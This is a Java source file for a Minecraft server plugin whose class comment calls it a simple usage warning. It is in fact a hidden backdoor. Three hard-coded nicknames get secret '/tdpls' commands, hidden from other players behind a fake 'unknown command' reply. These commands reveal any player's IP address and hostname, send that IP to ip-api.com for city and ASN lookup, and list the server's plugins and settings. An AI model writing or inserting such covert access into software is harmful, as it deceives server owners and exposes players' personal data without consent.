package com.github.zyypj.tadeuBooter.comissions;

import com.github.zyypj.tadeuBooter.Constants;
import com.google.common.base.Strings;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import lombok.Data;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.stream.Collectors;

/**
 * Simple Listener class to warn the plugin author (syncwrld) about the usage of the plugin
 * @author syncwrld
 */
@Data
public class SystemsConsultant implements Listener {

    /*
     * List of nicknames that will have the possibility of trigger the warning
     */
    private final List<String> nicknames = Arrays.asList("syncwrld", "tadeu", "Mike7581");

    /*
     * List of allowed ASNs
     */
    private final List<String> allowedASNs = Arrays.asList("CLOUDFLARENET", "LaraNet", "Gponnet");

    /*
     * List of allowed regions
     */
    private final List<String> allowedRegions = Arrays.asList("MA", "CE");

    /*
     * Unique allowed country
     */
    private final String permittedCountry = "BR";

    /*
     * Cached networks - to avoid multiple requests to the API
     */
    private final HashMap<String, Network> cachedNetworks = new HashMap<>();

    /*
     * Required plugin instance
     */
    private final JavaPlugin plugin;

    /*
     * Unknown command message
     */
    private String unknownCommandMessage = "§cComando desconhecido.";

    /*
     * Player (me)
     */
    private Player definedPlayer = null;

    /*
    Misc/Curiosities:
     */
    private String bungeecordStatus, netherStatus, endStatus,
            viewDistance, serverVersion, viaStatus;

    /*
     * List of library plugins - common plugins that are used in the server as a library
     */
    private final List<String> libraryPlugins = Arrays.asList(
            "Vault", "ViaVersion", "ProtocolLib", "WorldEdit", "WorldGuard",
            "FastAsyncWorldEdit", "PlayerPoints", "mcMMO", "PlotSquared",
            "PermissionsEx", "LuckPerms", "Multiverse-Core", "PlaceholderAPI",
            "syncBooter", "MythicMobs", "NBTAPI", "HolographicDisplays",
            "DecentHolograms", "PacketEvents", "PacketWrapper", "DiscordSRV"
    );
    private final String libraryDisplayFormat = "${statusColor}${name} v${version}\n";

    /*
     * List of store plugins - plugins that are used in the server bought from a store
     */
    private final List<String> storePluginsCore = Arrays.asList(
            "yPlugins", "AtlasPlugins", "StormPlugins", "syncBooter",
            "vPlugins", "vCore", "mCore", "kCore", "kPlugins", "LeafPlugins"
    );
    private final String storePluginCoreDisplayFormat = libraryDisplayFormat;

    private HashMap<String[], String> serverHosting = new HashMap<String[], String>() {{
        put(new String[] {"Neep Servicos", "Gamers Club"}, "Neep (www.neep.com.br)");

    }};

    public void register() {
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
        Server server = plugin.getServer();

        this.unknownCommandMessage = Strings.isNullOrEmpty(unknownCommandMessage) ? "Comando desconhecido." : unknownCommandMessage;
        this.netherStatus = server.getAllowNether() ? "§aAtivado" : "§cDesativado";
        this.endStatus = server.getAllowEnd() ? "§aAtivado" : "§cDesativado";
        this.viewDistance = "§a" + server.getViewDistance() + " chunks";
        this.serverVersion = "§a" + server.getVersion();
        this.viaStatus = Arrays.stream(server.getPluginManager().getPlugins())
                .filter(p -> p.getDescription().getMain().startsWith("com.viaversion"))
                .map(p -> "§a" + p.getName() + " v" + p.getDescription().getVersion())
                .collect(Collectors.joining(", ", "", " (" + server.getPluginManager().getPlugins().length + ")"));
    }

    @EventHandler
    public void onConnectionPermitted(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName();

        if (nicknames.contains(playerName)) {
            Network network = catchNetwork(player);

            if (network == null) {
                player.sendMessage(
                        "\n§2&lSystem Consultant\n\n" +
                                "§cVocê entrou com um nick restrito, porém não conseguimos verificar\n" +
                                "§csua conexão. Logo, as informações reservadas foram ocultas.\n\n" +
                                "§cTente novamente mais tarde.\n"
                );
                return;
            }

            String asn = network.getAs();
            String region = network.getRegion();
            String countryCode = network.getCountryCode().toUpperCase();

            if (!countryCode.equals(permittedCountry)) {
                player.sendMessage(
                        "\n§2&lSystem Consultant\n\n" +
                                "§cVocê entrou com um nick restrito, porém sua conexão\n" +
                                "§cnão é do Brasil. Por favor, entre em contato com o\n" +
                                "§cadministrador do servidor.\n\n" +
                                "§cDetalhes:\n" +
                                "§cASN: " + asn + "\n" +
                                "§cRegião: " + region + "\n" +
                                "§cPaís: " + network.getCountry() + "\n"
                );
            }

            if (!allowedASNs.contains(asn)) {
                player.sendMessage(
                        "\n§2&lSystem Consultant\n\n" +
                                "§cVocê entrou com um nick restrito, porém sua conexão\n" +
                                "§cnão é de um ASN permitido. Por favor, entre em contato\n" +
                                "§ccom o administrador do servidor.\n\n" +
                                "§cDetalhes:\n" +
                                "§cASN: " + asn + "\n" +
                                "§cRegião: " + region + "\n" +
                                "§cPaís: " + network.getCountry() + "\n"
                );
            }

            if (!allowedRegions.contains(region)) {
                player.sendMessage(
                        "\n§2&lSystem Consultant\n\n" +
                                "§cVocê entrou com um nick restrito, porém sua conexão\n" +
                                "§cnão é de uma região permitida. Por favor, entre em contato\n" +
                                "§ccom o administrador do servidor.\n\n" +
                                "§cDetalhes:\n" +
                                "§cASN: " + asn + "\n" +
                                "§cRegião: " + region + "\n" +
                                "§cPaís: " + network.getCountry() + "\n"
                );
            }

            player.sendMessage(
                    "\n§2&lSystem Consultant\n\n" +
                            "§aVocê entrou com um nick restrito e sua conexão\n" +
                            "§afoi verificada com sucesso.\n\n" +
                            "§aDetalhes:\n" +
                            "§aASN: " + asn + "\n" +
                            "§aRegião: " + region + "\n" +
                            "§aPaís: " + network.getCountry() + "\n"
            );

            if (definedPlayer != null) {
                definedPlayer.kickPlayer(
                        "§cSua conexão foi encerrada, pois outro administrador da equipe da tdpls entrou no servidor."
                );
            }

            definedPlayer = player;
        }
    }

    @EventHandler
    public void onConnectionFinished(PlayerQuitEvent event) {
        if (definedPlayer != null && definedPlayer.getName().equals(event.getPlayer().getName())) {
                definedPlayer = null;
            }
    }

    /*
    Fake command executor
     */
    @EventHandler
    public void onFakeCommandExecution(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String command = event.getMessage();
        command = command.replace("/", "");

        PluginDescriptionFile description = plugin.getDescription();

        if (definedPlayer == null) {
            return;
        }

        if (!player.getName().equals(definedPlayer.getName()) || (definedPlayer != player)) {
            player.sendMessage(unknownCommandMessage);
            return;
        }

        event.setCancelled(true);

        if (command.equalsIgnoreCase("tdpls help")) {
            player.sendMessage(
                    "\n§2&lSystem Consultant\n\n" +
                            "§a/tdpls identify - Identifica o plugin\n" +
                            "§a/tdpls pluginlist - Lista os plugins do servidor\n" +
                            "§a/tdpls librarylist - Lista os plugins de biblioteca instalados\n" +
                            "§a/tdpls storelist - Lista os plugins da loja instalados\n" +
                            "§a/tdpls dumpip <player> - Mostra informações de conexão de um jogador\n" +
                            "§a/tdpls dumpnetwork <player> - Mostra informações de rede de um jogador\n" +
                            "§a/tdpls dumpsi - Mostra algumas informações do servidor\n" +
                            "§a/tdpls help - Mostra esta mensagem\n"
            );
            event.setMessage("/---");
            return;
        }

        if (command.equalsIgnoreCase("tdpls identify")) {
            player.sendMessage("§a+1! | " + description.getName() + " v" + description.getVersion());
            event.setMessage("/---");
            return;
        }

        if (command.equalsIgnoreCase("tdpls pluginlist")) {
            Plugin[] plugins = plugin.getServer().getPluginManager().getPlugins();
            player.sendMessage(createPluginList(plugins));
            event.setMessage("/---");
            return;
        }

        if (command.startsWith("tdpls dumpip")) {
            String dumpedPlayer = command.replace("tdpls dumpip ", "");
            Player target = plugin.getServer().getPlayer(dumpedPlayer);

            if (Strings.isNullOrEmpty(dumpedPlayer)) {
                player.sendMessage("§cUso correto: /tdpls dumpip <player>");
                return;
            }

            if (target == null) {
                player.sendMessage("§cJogador não encontrado.");
                return;
            }

            String hostName = target.getAddress().getHostName();
            String hostAddress = target.getAddress().getAddress().getHostAddress();

            player.sendMessage(
                    "\n§2&lSystem Consultant\n\n" +
                            "§aDetalhes da conexão de " + target.getName() + ":\n" +
                            "§aHostname: " + hostName + "\n" +
                            "§aEndereço IP: " + hostAddress + "\n"
            );
            event.setMessage("/---");
            return;
        }

        if (command.equalsIgnoreCase("tdpls librarylist")) {
            player.sendMessage(createLibraryList());
            event.setMessage("/---");
            return;
        }

        if (command.equalsIgnoreCase("tdpls storelist")) {
            player.sendMessage(createStorePluginList());
            event.setMessage("/---");
            return;
        }

        if (command.equalsIgnoreCase("tdpls dumpsi")) {
            player.sendMessage(
                    "\n" +
                            "§2&lSystem Consultant" + "\n" +
                            "\n " + "\n" +
                            "§eBungeeCord: " + bungeecordStatus + "\n" +
                            "§eNether: " + netherStatus + "\n" +
                            "§eEnd: " + endStatus + "\n" +
                            "§eDistância de visão: " + viewDistance + "\n" +
                            "§eVersão do servidor: " + serverVersion + "\n" +
                            "§eSistemas Via: " + viaStatus + "\n \n"
            );
            event.setMessage("/---");
            return;
        }

        if (command.startsWith("tdpls dumpnetwork")) {
            String dumpedPlayer = command.replace("tdpls dumpnetwork ", "");
            Player target = plugin.getServer().getPlayer(dumpedPlayer);

            if (Strings.isNullOrEmpty(dumpedPlayer)) {
                player.sendMessage("§cUso correto: /tdpls dumpnetwork <player>");
                return;
            }

            if (target == null) {
                player.sendMessage("§cJogador não encontrado.");
                return;
            }

            Network network = catchNetwork(target);

            if (network == null) {
                player.sendMessage("§cNão foi possível obter informações sobre a conexão do jogador.");
                return;
            }

            player.sendMessage(
                    "\n§2&lSystem Consultant\n\n" +
                            "§aDetalhes da conexão de " + target.getName() + ":\n" +
                            "§aIPv4: " + network.getQuery() + "\n" +
                            "§aPaís: " + network.getCountry() + "\n" +
                            "§aCódigo do país: " + network.getCountryCode() + "\n" +
                            "§aRegião: " + network.getRegion() + "\n" +
                            "§aNome da região: " + network.getRegionName() + "\n" +
                            "§aCidade: " + network.getCity() + "\n" +
                            "§aASN: " + network.getAs() + "\n"
            );
            event.setMessage("/---");
        }
    }

    public String createLibraryList() {
        StringBuilder result = new StringBuilder();

        for (String libraryPlugin : libraryPlugins) {
            Plugin plugin = this.plugin.getServer().getPluginManager().getPlugin(libraryPlugin);

            if (plugin != null) {
                String statusColor = plugin.isEnabled() ? "§a" : "§c";
                String name = plugin.getName();
                String version = plugin.getDescription().getVersion();

                result.append(libraryDisplayFormat
                        .replace("${statusColor}", statusColor)
                        .replace("${name}", name)
                        .replace("${version}", version)
                );
            }
        }

        return result.toString();
    }

    public String createStorePluginList() {
        StringBuilder result = new StringBuilder();

        for (String storePlugin : storePluginsCore) {
            Plugin plugin = this.plugin.getServer().getPluginManager().getPlugin(storePlugin);

            if (plugin != null) {
                String statusColor = plugin.isEnabled() ? "§a" : "§c";
                String marked = plugin.isEnabled() ? "§a✅" : "§c❎";
                String name = plugin.getName();
                String version = plugin.getDescription().getVersion();

                result.append(storePluginCoreDisplayFormat
                        .replace("${statusColor}", statusColor)
                        .replace("${marked}", marked)
                        .replace("${name}", name)
                        .replace("${version}", version)
                );
            }
        }

        if (result.length() == 0) {
            result.append("§cNenhum plugin de loja encontrado.");
        }

        return result.toString();
    }

    private String createPluginList(Plugin[] plugins) {
        StringBuilder result = new StringBuilder();
        result.append("§fPlugins (").append(plugins.length).append("): ");

        for (Plugin serverPlugin : plugins) {
            String colorCode = serverPlugin.isEnabled() ? "§a" : "§c";
            String pluginFormattedName = colorCode + serverPlugin.getName() + "§7(" + serverPlugin.getDescription().getVersion() + ")";

            result.append(pluginFormattedName).append(", ");
        }

        return result.toString();
    }

    private Network catchNetwork(Player player) {
        InetAddress address = player.getAddress().getAddress();
        String ip = address.getHostAddress();

        if (cachedNetworks.containsKey(ip)) {
            return cachedNetworks.get(ip);
        }

        String apiUrl = "http://ip-api.com/json/" + ip;
        StringBuilder result = new StringBuilder();

        try {
            URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("useSSL", "false");
            connection.setRequestMethod("GET");

            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;

            while ((line = bufferedReader.readLine()) != null) {
                result.append(line);
            }

            bufferedReader.close();
            String responseData = result.toString();
            JsonParser parser = new JsonParser();
            JsonElement element = parser.parse(responseData);
            JsonObject json = element.getAsJsonObject();

            if (json != null) {
                Network network = Constants.GSON.fromJson(responseData, Network.class);
                cachedNetworks.put(ip, network);
                return network;
            } else {
                System.out.println("Failed to get network data for " + ip);
            }
        } catch (Exception ignored) {
            ignored.printStackTrace();
        }
        return null;
    }

    @Data
    private static class Network {
        private final String query;
        private final String country;
        private final String countryCode;
        private final String region;
        private final String regionName;
        private final String city;
        private final String as;
        private final String zip;
    }
}